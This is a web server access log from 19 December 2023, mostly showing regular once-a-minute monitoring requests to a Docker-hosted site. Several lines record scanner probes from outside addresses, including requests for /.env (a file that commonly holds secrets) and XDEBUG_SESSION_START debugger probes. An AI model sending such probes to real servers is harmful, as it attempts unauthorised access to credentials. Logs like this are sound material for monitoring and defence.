159.203.109.206 - - [19/Dec/2023:15:36:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9966 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9967 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:15:37:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9968 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9969 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:15:38:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9970 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:15:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9971 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:15:39:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9972 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9973 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:15:40:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9974 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9975 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:15:41:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9976 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9977 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:15:42:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9978 "www@docker" "http://172.18.0.9:80" 0ms
45.79.163.53 - - [19/Dec/2023:15:42:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9979 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:15:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9980 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:15:43:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9981 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:15:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9982 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:15:44:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9983 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9984 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:15:45:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9985 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9986 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:15:46:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9987 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:15:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9988 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:15:47:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9989 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9990 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:15:48:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9991 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:15:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9992 "www@docker" "http://172.18.0.9:80" 0ms
90.151.171.106 - - [19/Dec/2023:15:49:02 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 9993 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [19/Dec/2023:15:49:12 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 9994 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:15:49:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9995 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9996 "www@docker" "http://172.18.0.9:80" 0ms
45.79.168.172 - - [19/Dec/2023:15:49:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9997 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:15:50:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9998 "www@docker" "http://172.18.0.9:80" 0ms
198.74.56.46 - - [19/Dec/2023:15:50:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9999 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:15:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10000 "www@docker" "http://172.18.0.9:80" 0ms
45.33.80.243 - - [19/Dec/2023:15:51:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10001 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:15:51:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10002 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:15:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10003 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:15:52:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10004 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10005 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:15:53:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10006 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:15:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10007 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:15:54:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10008 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10009 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:15:55:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10010 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10011 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:15:56:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10012 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:15:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10013 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:15:57:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10014 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10015 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:15:58:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10016 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10017 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:15:59:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10018 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:15:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10019 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:00:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10020 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:16:00:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10021 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:16:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10022 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:01:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10023 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10024 "www@docker" "http://172.18.0.9:80" 0ms
51.254.49.97 - - [19/Dec/2023:16:01:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10025 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:02:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10026 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10027 "www@docker" "http://172.18.0.9:80" 0ms
83.97.73.87 - - [19/Dec/2023:16:02:37 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 17 "-" "-" 10028 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [19/Dec/2023:16:02:39 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 10029 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:03:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10030 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10031 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:04:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10032 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10033 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:05:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10034 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10035 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:06:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10036 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10037 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:07:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10038 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10039 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:08:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10040 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10041 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:09:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10042 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10043 "www@docker" "http://172.18.0.9:80" 0ms
69.164.217.245 - - [19/Dec/2023:16:09:46 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10044 "-" "-" 0ms
45.79.181.179 - - [19/Dec/2023:16:10:00 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10045 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:10:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10046 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10047 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:11:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10048 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10049 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:12:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10050 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10051 "www@docker" "http://172.18.0.9:80" 0ms
117.62.218.192 - - [19/Dec/2023:16:12:45 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10052 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:13:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10053 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10054 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:14:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10055 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10056 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:15:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10057 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10058 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [19/Dec/2023:16:16:16 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 10059 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:16:16:16 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 10060 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:16:16:19 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 10061 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:16:16:20 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 10062 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:16:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10063 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10064 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:17:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10065 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10066 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:16:17:58 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 10067 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:18:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10068 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10069 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:19:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10070 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10071 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:20:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10072 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10073 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:21:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10074 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10075 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:22:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10076 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10077 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:23:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10078 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10079 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:24:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10080 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10081 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:25:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10082 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10083 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:26:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10084 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10085 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:27:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10086 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10087 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:28:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10088 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10089 "www@docker" "http://172.18.0.9:80" 1ms
83.97.73.87 - - [19/Dec/2023:16:29:10 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 17 "-" "-" 10090 "web-to-websecure@internal" "-" 0ms
83.97.73.87 - - [19/Dec/2023:16:29:11 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 10091 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:29:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10092 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10093 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:30:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10094 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10095 "www@docker" "http://172.18.0.9:80" 0ms
209.141.60.74 - - [19/Dec/2023:16:30:55 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10096 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:31:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10097 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10098 "www@docker" "http://172.18.0.9:80" 0ms
45.33.87.154 - - [19/Dec/2023:16:31:39 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10099 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:32:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10100 "www@docker" "http://172.18.0.9:80" 0ms
192.155.90.220 - - [19/Dec/2023:16:32:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10101 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:16:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10102 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:33:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10103 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10104 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:34:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10105 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10106 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:35:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10107 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10108 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:16:35:47 +0000] "GET /logs/ HTTP/2.0" 200 2472 "-" "-" 10109 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:16:35:47 +0000] "GET /logs/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 10110 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:16:35:47 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2463 "-" "-" 10111 "www@docker" "http://172.18.0.9:80" 209ms
173.48.140.140 - - [19/Dec/2023:16:35:54 +0000] "GET /logs/logtail.php?page=0 HTTP/2.0" 200 2518 "-" "-" 10112 "www@docker" "http://172.18.0.9:80" 20ms
159.203.109.206 - - [19/Dec/2023:16:36:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10113 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10114 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:37:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10115 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10116 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:38:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10117 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10118 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:39:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10119 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:16:39:31 +0000] "GET /ip/ HTTP/2.0" 404 153 "-" "-" 10120 "www@docker" "http://172.18.0.9:80" 3ms
173.48.140.140 - - [19/Dec/2023:16:39:31 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/2.0" 404 153 "-" "-" 10121 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:16:39:31 +0000] "GET /apple-touch-icon-120x120.png HTTP/2.0" 404 153 "-" "-" 10122 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:16:39:31 +0000] "GET /apple-touch-icon-precomposed.png HTTP/2.0" 404 153 "-" "-" 10123 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:16:39:31 +0000] "GET /apple-touch-icon.png HTTP/2.0" 404 153 "-" "-" 10124 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:16:39:31 +0000] "GET /favicon.ico HTTP/2.0" 404 153 "-" "-" 10125 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:16:39:31 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/2.0" 404 153 "-" "-" 10126 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:16:39:31 +0000] "GET /apple-touch-icon-120x120.png HTTP/2.0" 404 153 "-" "-" 10127 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:16:39:31 +0000] "GET /apple-touch-icon-precomposed.png HTTP/2.0" 404 153 "-" "-" 10128 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:16:39:31 +0000] "GET /apple-touch-icon.png HTTP/2.0" 404 153 "-" "-" 10129 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [19/Dec/2023:16:39:31 +0000] "GET /favicon.ico HTTP/2.0" 404 153 "-" "-" 10130 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10131 "www@docker" "http://172.18.0.9:80" 1ms
185.180.140.6 - - [19/Dec/2023:16:40:11 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10132 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:40:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10133 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10134 "www@docker" "http://172.18.0.9:80" 0ms
167.94.146.53 - - [19/Dec/2023:16:40:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10135 "-" "-" 0ms
167.94.146.53 - - [19/Dec/2023:16:40:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10136 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:16:41:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10137 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10138 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:42:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10139 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10140 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:43:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10141 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10142 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:16:44:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10143 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:16:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10144 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:45:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10145 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:16:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10146 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:16:46:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10147 "www@docker" "http://172.18.0.9:80" 0ms
